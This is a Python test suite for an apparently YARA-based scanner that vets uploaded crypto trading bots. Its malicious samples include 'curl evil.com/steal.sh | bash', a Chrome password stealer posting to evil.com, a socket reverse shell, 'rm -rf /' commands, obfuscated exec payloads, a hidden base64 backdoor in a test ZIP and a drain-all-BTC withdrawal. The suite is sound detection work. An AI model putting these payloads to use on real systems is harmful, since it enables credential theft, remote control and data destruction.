import glob
import io
import unittest
import tempfile
import zipfile
import os
import sys
from unittest.mock import Mock, patch

from src.tests.mocks import MockStorageClient, MockDatabaseClient

# Add src to path for testing
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "src"))

from src.rule_manager import RuleManager
from src.analyzer import The0vers33r


class Test0VERS33RMalwareDetection(unittest.TestCase):
    """
    Test suite to ensure 0VERS33R catches actual malicious patterns
    """

    def setUp(self):
        """Set up test environment"""
        self.temp_dir = tempfile.mkdtemp()
        self.rule_manager = RuleManager("yara_rules")
        self.rule_manager.load_and_compile_rules()

    def tearDown(self):
        """Clean up test environment"""
        import shutil

        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_critical_code_execution_detection(self):
        """Test detection of critical code execution patterns"""

        # Malicious code samples
        malicious_samples = [
            # eval() exploitation
            b"""
import sys
user_input = sys.argv[1]
result = eval(user_input)  # CRITICAL: Code injection
print(result)
""",
            # exec() exploitation
            b"""
def execute_command(cmd):
    exec(cmd)  # CRITICAL: Dynamic code execution

execute_command("os.system('rm -rf /')")
""",
            # __import__ exploitation
            b"""
module_name = "os"
imported = __import__(module_name)  # CRITICAL: Dynamic import
imported.system("curl evil.com/steal.sh | bash")
""",
            # pickle exploitation
            b"""
import pickle
data = request.get_data()
obj = pickle.loads(data)  # CRITICAL: Unsafe deserialization
""",
        ]

        for i, sample in enumerate(malicious_samples):
            with self.subTest(sample_id=i):
                score, matches = self.rule_manager.scan(sample, f"malicious_{i}.py")

                # Should detect critical threats
                self.assertGreaterEqual(
                    score, 4, f"Sample {i} should be critical (score >= 4), got {score}"
                )
                self.assertGreater(len(matches), 0, f"Sample {i} should have matches")

                # Check for critical severity
                critical_matches = [m for m in matches if m["severity"] == "critical"]
                self.assertGreater(
                    len(critical_matches), 0, f"Sample {i} should have critical matches"
                )

    def test_os_command_injection_detection(self):
        """Test detection of OS command injection"""

        malicious_samples = [
            # os.system exploitation
            b"""
import os
user_input = input("Enter command: ")
os.system(user_input)  # CRITICAL: Command injection
""",
            # subprocess exploitation
            b"""
import subprocess
cmd = ["rm", "-rf", "/"]
subprocess.call(cmd)  # CRITICAL: Dangerous system command
""",
            # subprocess with shell=True
            b"""
import subprocess
user_cmd = "ls; rm -rf /"
subprocess.run(user_cmd, shell=True)  # CRITICAL: Shell injection
""",
        ]

        for i, sample in enumerate(malicious_samples):
            with self.subTest(sample_id=i):
                score, matches = self.rule_manager.scan(sample, f"cmd_injection_{i}.py")
                self.assertGreaterEqual(
                    score, 3, f"Command injection {i} should be high severity"
                )

    def test_trading_bot_specific_threats(self):
        """Test detection of trading bot specific threats"""

        # Hardcoded API credentials (CRITICAL)
        hardcoded_creds = b"""
import binance
api_key = "8xKj9mN2pQ7rS5tU4vW6xY8zA1bC3dE5fG7hI9jK2lM4nO6pQ8rS0tU2vW4xY6zA"
secret_key = "9yLk0mN3qR8sT6uX7wZ9aB2cD4eF6gH8iJ0kL2mN4oP6qR8sT0uV2wX4yZ6aB8cD"
client = binance.Client(api_key, secret_key)
"""

        # Suspicious withdrawal pattern
        suspicious_withdrawal = b"""
import binance
client = binance.Client(api, secret)
# Withdraw all BTC to hardcoded address
btc_balance = client.get_account()['balances']['BTC']
client.withdraw(
    asset='BTC', 
    address='1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa',  # Hardcoded address
    amount=btc_balance['free']  # All available balance
)
"""

        # Market manipulation
        pump_dump = b"""
import telegram
import binance

def pump_signal_handler(update, context):
    if "PUMP DOGE" in update.message.text:
        # Coordinated pump and dump
        for exchange in [binance_client, coinbase_client]:
            exchange.create_market_buy_order('DOGE/USDT', 100000)
"""

        samples = [
            (hardcoded_creds, "hardcoded_creds.py", 5),
            (suspicious_withdrawal, "withdrawal.py", 3),
            (pump_dump, "pump_dump.py", 3),
        ]

        for sample, filename, expected_min_score in samples:
            with self.subTest(filename=filename):
                score, matches = self.rule_manager.scan(sample, filename)
                self.assertGreaterEqual(
                    score,
                    expected_min_score,
                    f"{filename} should have score >= {expected_min_score}, got {score}",
                )

    def test_legitimate_trading_bot_low_score(self):
        """Test that legitimate trading bots get low scores"""

        legitimate_samples = [
            # Normal CCXT usage
            b"""
import ccxt
import os

# Proper API key management
api_key = os.getenv('BINANCE_API_KEY')
secret = os.getenv('BINANCE_SECRET')

exchange = ccxt.binance({
    'apiKey': api_key,
    'secret': secret,
})

# Normal trading operations
balance = exchange.fetch_balance()
if balance['BTC']['free'] > 0.01:
    order = exchange.create_market_sell_order('BTC/USDT', 0.005)
    print(f"Sold BTC: {order}")
""",
            # Risk management bot
            b"""
import ccxt
import pandas as pd

class TradingBot:
    def __init__(self):
        self.exchange = ccxt.binance()
        self.stop_loss = 0.02  # 2% stop loss
        self.position_size = 0.1  # 10% of portfolio

    def risk_management(self, symbol):
        ticker = self.exchange.fetch_ticker(symbol)
        if ticker['last'] < self.stop_loss_price:
            self.create_order('sell', symbol, self.position_size)
""",
        ]

        for i, sample in enumerate(legitimate_samples):
            with self.subTest(sample_id=i):
                score, matches = self.rule_manager.scan(sample, f"legit_{i}.py")
                self.assertLessEqual(
                    score,
                    2,
                    f"Legitimate sample {i} should have low score, got {score}",
                )

    def test_credential_theft_detection(self):
        """Test detection of credential theft patterns"""

        credential_theft = b"""
import sqlite3
import os
import shutil

# Steal Chrome passwords
chrome_path = os.path.expanduser("~/.config/google-chrome/Default/Login Data")
temp_db = "/tmp/chrome_passwords.db"
shutil.copy(chrome_path, temp_db)

conn = sqlite3.connect(temp_db)
cursor = conn.execute("SELECT origin_url, username_value, password_value FROM logins")

stolen_creds = []
for row in cursor.fetchall():
    url, username, encrypted_password = row
    # Decrypt password using win32crypt or similar
    password = decrypt_chrome_password(encrypted_password)
    stolen_creds.append((url, username, password))

# Exfiltrate to attacker server
import requests
requests.post("http://evil.com/collect", json=stolen_creds)
"""

        score, matches = self.rule_manager.scan(credential_theft, "credential_theft.py")
        self.assertGreaterEqual(score, 4, "Credential theft should be critical")

        # Should match multiple rules
        self.assertGreater(len(matches), 2, "Should trigger multiple rules")

    def test_reverse_shell_detection(self):
        """Test detection of reverse shell patterns"""

        reverse_shells = [
            # Socket reverse shell
            b"""
import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.100", 4444))

while True:
    cmd = s.recv(1024).decode()
    if cmd == 'exit':
        break
    output = subprocess.check_output(cmd, shell=True)
    s.send(output)
""",
            # PowerShell reverse shell
            b"""
import subprocess
import base64

powershell_payload = "cG93ZXJzaGVsbCAtZW5jIEpBQT0="  # Base64 encoded
subprocess.run(f"powershell -enc {powershell_payload}", shell=True)
""",
        ]

        for i, sample in enumerate(reverse_shells):
            with self.subTest(sample_id=i):
                score, matches = self.rule_manager.scan(sample, f"reverse_shell_{i}.py")
                self.assertGreaterEqual(
                    score, 3, f"Reverse shell {i} should be high severity"
                )

    def test_obfuscation_detection(self):
        """Test detection of code obfuscation"""

        obfuscated_samples = [
            # Base64 obfuscation
            b"""
import base64
import exec

encoded_payload = "aW1wb3J0IG9zOyBvcy5zeXN0ZW0oInJtIC1yZiAvIik="
decoded = base64.b64decode(encoded_payload)
exec(decoded)  # Execute obfuscated code
""",
            # Hex string obfuscation
            b"""
import binascii

hex_code = "696d706f7274206f733b206f732e73797374656d2822726d202d7266202f22293b"
payload = binascii.unhexlify(hex_code)
exec(payload.decode())
""",
            # Chr() obfuscation
            b"""
# Obfuscated "import os; os.system('rm -rf /')"
obfuscated = chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(32)+chr(111)+chr(115)
exec(obfuscated)
""",
        ]

        for i, sample in enumerate(obfuscated_samples):
            with self.subTest(sample_id=i):
                score, matches = self.rule_manager.scan(sample, f"obfuscated_{i}.py")
                self.assertGreaterEqual(
                    score, 2, f"Obfuscated code {i} should be suspicious"
                )

    def test_cve_specific_patterns(self):
        """Test detection of specific CVE patterns"""

        cve_samples = [
            # CVE-2023-24329: URL parsing bypass
            (
                b"""
import urllib.parse
malicious_url = "http://@evil.com@legitimate.com/path"
parsed = urllib.parse.urlparse(malicious_url)
# This bypasses hostname validation
""",
                "cve_2023_24329.py",
            ),
            # CVE-2007-4559: Tarfile path traversal
            (
                b"""
import tarfile
with tarfile.open("malicious.tar.gz", "r:gz") as tar:
    tar.extractall()  # Unsafe extraction - path traversal
""",
                "cve_2007_4559.py",
            ),
            # CVE-2017-18342: PyYAML unsafe loading
            (
                b"""
import yaml
user_data = "!!python/object/apply:os.system ['rm -rf /']"
yaml.load(user_data)  # Unsafe YAML loading
""",
                "cve_2017_18342.py",
            ),
        ]

        for sample, filename in cve_samples:
            with self.subTest(filename=filename):
                score, matches = self.rule_manager.scan(sample, filename)
                self.assertGreaterEqual(
                    score, 3, f"{filename} should detect CVE pattern"
                )

    def test_zip_file_analysis_end_to_end(self):
        """Test end-to-end analysis of ZIP files with malicious content"""

        # Create a temporary ZIP file with malicious content
        zip_path = os.path.join(self.temp_dir, "malicious_bot.zip")

        with zipfile.ZipFile(zip_path, "w") as zf:
            # Add legitimate-looking file
            zf.writestr(
                "bot.py",
                b"""
import ccxt
exchange = ccxt.binance()
print("Starting trading bot...")
""",
            )

            # Add malicious file
            zf.writestr(
                "utils.py",
                b"""
import os
import base64

# Hidden backdoor
def innocent_function():
    print("Calculating indicators...")

def secret_backdoor():
    # Base64 encoded: os.system('curl evil.com/steal.sh | bash')
    payload = "b3Muc3lzdGVtKCdjdXJsIGV2aWwuY29tL3N0ZWFsLnNoIHwgYmFzaCcp"
    decoded = base64.b64decode(payload)
    exec(decoded)  # CRITICAL: Hidden backdoor

secret_backdoor()
""",
            )

            # Add config file with hardcoded credentials
            zf.writestr(
                "config.py",
                b"""
# Trading configuration
BINANCE_API_KEY = "real_api_key_here_8xKj9mN2pQ7rS5tU4vW6xY8zA1bC3dE5fG"
BINANCE_SECRET = "real_secret_here_9yLk0mN3qR8sT6uX7wZ9aB2cD4eF6gH8iJ0k"
""",
            )

        # Mock the analyzer to use our test ZIP
        with patch.object(The0vers33r, "_scan_gcs_code") as mock_scan:

            def mock_scan_implementation(gcs_path, runtime="python3.11"):
                with open(zip_path, "rb") as f:
                    zip_content = f.read()
                results = self._scan_zip_helper(zip_content)
                return results, {}

            mock_scan.side_effect = mock_scan_implementation

            # Create analyzer and test
            analyzer = The0vers33r(
                storage_client=MockStorageClient(), database_client=MockDatabaseClient()
            )

            test_bot_data = {
                "id": "test_malicious_bot",
                "name": "Innocent Trading Bot",
                "config": {
                    "name": "Totally Legit Bot",
                    "description": "Just a normal trading bot",
                    "type": "trading",
                    "author": "Definitely Not A Hacker",
                    "entrypoints": {"bot": "bot.py"},
                },
                "gcsPath": "gs://test-bucket/malicious_bot.zip",
                "userId": "user123",
            }

            status, review_data = analyzer.analyze_bot(test_bot_data)

            # Should be declined due to multiple threats
            self.assertEqual(status, "declined", "Malicious bot should be declined")
            self.assertGreaterEqual(
                review_data["score"], 4, "Should have high threat score"
            )
            self.assertGreater(
                len(review_data["yaraMatches"]), 0, "Should have YARA matches"
            )

            # Check threat summary
            threat_summary = review_data["threatSummary"]
            self.assertIn(
                "critical",
                threat_summary["severityCounts"],
                "Should detect critical threats",
            )
            self.assertGreater(
                threat_summary["totalMatches"], 2, "Should have multiple matches"
            )

    def _scan_zip_helper(self, zip_content):
        """Helper method to scan ZIP content for testing"""
        results = {
            "score": 0,
            "filesScanned": [],
            "yaraMatches": [],
            "issues": [],
            "totalFiles": 0,
        }

        try:
            with zipfile.ZipFile(io.BytesIO(zip_content), "r") as zip_file:
                file_list = zip_file.namelist()
                results["totalFiles"] = len(file_list)

                max_score = 0
                for file_path in file_list:
                    if file_path.endswith((".py", ".js", ".txt", ".json")):
                        file_content = zip_file.read(file_path)
                        file_score, file_matches = self.rule_manager.scan(
                            file_content, file_path, "python3.11"
                        )

                        results["filesScanned"].append(file_path)
                        if file_matches:
                            results["yaraMatches"].extend(file_matches)
                            for match in file_matches:
                                results["issues"].append(f"{file_path}:{match['rule']}")

                        max_score = max(max_score, file_score)

                results["score"] = max_score
                return results

        except Exception as e:
            results["score"] = 5
            results["issues"] = [f"zip_error_{type(e).__name__}"]
            return results

    def test_performance_benchmarks(self):
        """Test that scanning performance meets requirements"""
        import time

        # Create a moderately sized code sample
        large_sample = (
            b"""
import ccxt
import pandas as pd
import numpy as np

# Legitimate trading bot code
"""
            * 100
        )  # Repeat to create larger sample

        start_time = time.time()
        score, matches = self.rule_manager.scan(large_sample, "performance_test.py")
        end_time = time.time()

        scan_duration = end_time - start_time

        # Should complete in under 1 second for reasonable code size
        self.assertLess(
            scan_duration, 1.0, f"Scan took {scan_duration:.3f}s, should be under 1s"
        )
        print(
            f"Performance test: {len(large_sample)} bytes scanned in {scan_duration:.3f}s"
        )

    def test_false_positive_rates(self):
        """Test false positive rates on legitimate code"""

        legitimate_libraries = [
            b"import pandas as pd\nimport numpy as np\nimport matplotlib.pyplot as plt",
            b"import requests\nimport json\nimport time",
            b"import sqlite3\nimport os\nimport logging",
            b"from flask import Flask, request, jsonify",
            b"import tensorflow as tf\nimport keras",
        ]

        false_positives = 0
        total_samples = len(legitimate_libraries)

        for i, sample in enumerate(legitimate_libraries):
            score, matches = self.rule_manager.scan(sample, f"legit_lib_{i}.py")
            if score >= 3:  # High severity or above
                false_positives += 1
                print(f"False positive on sample {i}: score={score}, matches={matches}")

        false_positive_rate = false_positives / total_samples
        self.assertLessEqual(
            false_positive_rate,
            0.1,
            f"False positive rate {false_positive_rate:.2%} should be <= 10%",
        )

    def test_sample_files_detection(self):
        """Test detection on real malicious sample files"""
        sample_dir = os.path.join(os.path.dirname(__file__), "test_samples")
        sample_files = glob.glob(os.path.join(sample_dir, "*.py"))

        for sample_path in sample_files:
            with self.subTest(sample=sample_path):
                with open(sample_path, "rb") as f:
                    code = f.read()
                score, matches = self.rule_manager.scan(
                    code, os.path.basename(sample_path)
                )
                # All these samples are malicious, so expect high score
                self.assertGreaterEqual(
                    score, 3, f"{sample_path} should be high or critical risk"
                )
                self.assertGreater(
                    len(matches), 0, f"{sample_path} should trigger at least one rule"
                )
                print(f"Sample: {sample_path}")
                for match in matches:
                    print(
                        f"  Triggered rule: {match['rule']} (severity: {match.get('severity', 'unknown')})"
                    )


def run_threat_detection_demo():
    """
    Demo function to show 0VERS33R in action
    """
    print("🕵️ 0VERS33R Threat Detection Demo")
    print("=" * 50)

    rule_manager = RuleManager("yara_rules")
    if not rule_manager.load_and_compile_rules():
        print("❌ Failed to load YARA rules")
        return

    # Test samples with expected results
    test_cases = [
        (
            "Legitimate Trading Bot",
            b"""
import ccxt
exchange = ccxt.binance()
balance = exchange.fetch_balance()
print(f"Balance: {balance}")
""",
            "✅ Should be safe",
        ),
        (
            "Code Injection Attack",
            b"""
user_input = input("Enter formula: ")
result = eval(user_input)  # DANGEROUS!
print(result)
""",
            "🚨 Should be CRITICAL",
        ),
        (
            "Hardcoded API Keys",
            b"""
import binance
api_key = "8xKj9mN2pQ7rS5tU4vW6xY8zA1bC3dE5fG7hI9jK2lM4nO6pQ8rS0tU2vW4xY6zA"
client = binance.Client(api_key, "secret_here")
""",
            "🚨 Should be CRITICAL",
        ),
        (
            "Suspicious Network Activity",
            b"""
import requests
import socket
s = socket.socket()
s.connect(("192.168.1.100", 4444))
""",
            "⚠️ Should be SUSPICIOUS",
        ),
    ]

    for name, code, expected in test_cases:
        print(f"\n🔍 Testing: {name}")
        print(f"Expected: {expected}")

        score, matches = rule_manager.scan(code, f"{name.lower().replace(' ', '_')}.py")

        if score == 0:
            status = "✅ SAFE"
        elif score <= 2:
            status = "⚠️ SUSPICIOUS"
        elif score <= 3:
            status = "🟡 HIGH RISK"
        else:
            status = "🚨 CRITICAL"

        print(f"Result: {status} (Score: {score}/5)")

        if matches:
            print("Triggered rules:")
            for match in matches:
                print(f"  - {match['rule']} ({match['severity']})")

        print("-" * 30)


if __name__ == "__main__":
    # Run the demo
    run_threat_detection_demo()

    print("\n" + "=" * 50)
    print("🧪 Running Unit Tests...")

    # Run unit tests
    unittest.main(argv=[""], exit=False, verbosity=2)
